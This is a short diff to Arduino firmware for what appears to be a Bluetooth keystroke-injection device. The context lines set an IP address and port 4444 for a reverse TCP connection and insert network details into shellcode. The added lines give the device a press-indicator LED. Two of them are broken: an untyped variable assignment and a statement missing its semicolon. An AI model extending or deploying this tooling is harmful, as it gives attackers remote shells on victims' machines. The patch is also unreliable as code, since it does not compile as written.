@@ -77,6 +77,7 @@ Adafruit_BluefruitLE_SPI ble(BLUEFRUIT_SPI_CS, BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_
 //                             BLUEFRUIT_SPI_MOSI, BLUEFRUIT_SPI_CS,
 //                             BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_RST);
 
+ledPin = 21;
 
 int ip[] = {192,168,1,1}; // The IP address for Reverse_TCP connection
 int port = 4444; // The port - outward facing port, not internal port.
@@ -144,8 +145,10 @@ static const Button switch_pins[7] = {
 void setup(void)
 {
   // Ensure software power reset pin in high
+  pinMode(ledPin, OUTPUT);
   pinMode(EnPin, OUTPUT);      // Make pin an output,
   digitalWrite(EnPin, HIGH);  // and activate pullup.
+  digitalWrite(ledPin, LOW);
   //while (!Serial);  // Required for Flora & Micro
   delay(500);
   parseNet(); //Parse the network information, encode it into hexadecimal, and then insert it into the shellcode.
@@ -559,12 +562,14 @@ void processReading(){
       if (previousStableReading & ~currentStableReading) {
         state = RELEASING;
         sendKey(previousStableReading);
+        digitalWrite(ledPin, LOW);
       } 
       break;
 
     case RELEASING:
       if (currentStableReading & ~previousStableReading) {
         state = PRESSING;
+        digitalWrite(ledPin, HIGH)
       }
       break;
     }
